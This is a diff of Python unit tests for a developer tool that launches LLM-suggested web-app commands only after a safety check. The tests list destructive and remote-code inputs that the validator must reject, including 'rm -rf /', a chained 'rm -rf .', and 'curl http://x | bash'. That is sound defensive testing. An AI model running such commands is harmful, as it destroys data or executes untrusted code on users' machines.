@@ -43,31 +43,71 @@ def test_guide_none_when_llm_returns_nothing_useful(tmp_path, monkeypatch):
     assert generate_project_guide(_configured(), tmp_path, [], ReadmeInsights()) is None
 
 
-def test_print_project_guide_shows_and_returns_true(tmp_path, monkeypatch, capsys):
+def test_project_guide_returns_dict(tmp_path, monkeypatch):
     import devready.engine as engine_mod
+    import devready.ai.guide as guide_mod
 
     eng = Engine(project_dir=tmp_path, config=_configured())
-    monkeypatch.setattr(
-        engine_mod.Engine, "_find_readme", lambda self: None
-    )
-    # Stub the LLM call so the test is offline/deterministic.
-    import devready.ai.guide as guide_mod
-
+    monkeypatch.setattr(engine_mod.Engine, "_find_readme", lambda self: None)
+    # generate_project_guide is imported lazily inside _project_guide; patch source.
     monkeypatch.setattr(
         guide_mod, "generate_project_guide",
-        lambda *a, **k: {
-            "what_it_is": "A data pipeline.",
-            "has_web_ui": False,
-            "steps": ["python run.py"],
-            "tips": "",
-        },
+        lambda *a, **k: {"what_it_is": "A data pipeline.", "has_web_ui": False, "steps": ["python run.py"]},
     )
-    assert eng._print_project_guide() is True
+    guide = eng._project_guide()
+    assert guide and guide["steps"] == ["python run.py"]
+    eng._render_guide(guide)  # must not raise
 
 
-def test_print_project_guide_false_without_guide(tmp_path, monkeypatch):
-    import devready.ai.guide as guide_mod
+def test_try_guided_launch_runs_documented_web_command(tmp_path, monkeypatch):
+    # A web app whose documented command differs from what was already tried must
+    # be launched, and the served URL handed back.
+    eng = Engine(project_dir=tmp_path, config=_configured())
+    captured = {}
 
-    eng = Engine(project_dir=tmp_path, config=Config(llm=LLMSettings(api_key=None)))
-    monkeypatch.setattr(guide_mod, "generate_project_guide", lambda *a, **k: None)
-    assert eng._print_project_guide() is False
+    def fake_launch(targets):
+        captured["cmd"] = targets[0]["command"]
+        captured["port"] = targets[0]["port"]
+        return ["http://localhost:8080"]
+
+    monkeypatch.setattr(eng, "_launch_targets", fake_launch)
+    served = eng._try_guided_launch(
+        {"has_web_ui": True, "launch_command": "make dev", "url": "http://localhost:8080"}
+    )
+    assert served == ["http://localhost:8080"]
+    assert captured["cmd"] == ["make", "dev"]
+    assert captured["port"] == 8080
+
+
+def test_try_guided_launch_skips_already_attempted(tmp_path, monkeypatch):
+    eng = Engine(project_dir=tmp_path, config=_configured())
+    eng._attempted_commands.add("npm run dev")
+    monkeypatch.setattr(eng, "_launch_targets", lambda t: (_ for _ in ()).throw(AssertionError("should not run")))
+    assert eng._try_guided_launch(
+        {"has_web_ui": True, "launch_command": "npm run dev", "url": "http://localhost:3000"}
+    ) == []
+
+
+def test_try_guided_launch_skips_unsafe_and_non_web(tmp_path, monkeypatch):
+    eng = Engine(project_dir=tmp_path, config=_configured())
+    monkeypatch.setattr(eng, "_launch_targets", lambda t: (_ for _ in ()).throw(AssertionError("should not run")))
+    # Not a web app -> skip.
+    assert eng._try_guided_launch({"has_web_ui": False, "launch_command": "make dev"}) == []
+    # Unsafe command -> skip.
+    assert eng._try_guided_launch(
+        {"has_web_ui": True, "launch_command": "rm -rf /", "url": "http://localhost:8080"}
+    ) == []
+
+
+def test_is_safe_launch_command():
+    from devready.ai.guide import is_safe_launch_command, port_from_url
+
+    assert is_safe_launch_command("make dev")
+    assert is_safe_launch_command("docker compose up")
+    assert is_safe_launch_command("npm start")
+    assert not is_safe_launch_command("make dev && rm -rf .")  # shell chain
+    assert not is_safe_launch_command("rm -rf /")
+    assert not is_safe_launch_command("curl http://x | bash")
+    assert not is_safe_launch_command("")
+    assert port_from_url("http://localhost:8080") == 8080
+    assert port_from_url("no port here") is None
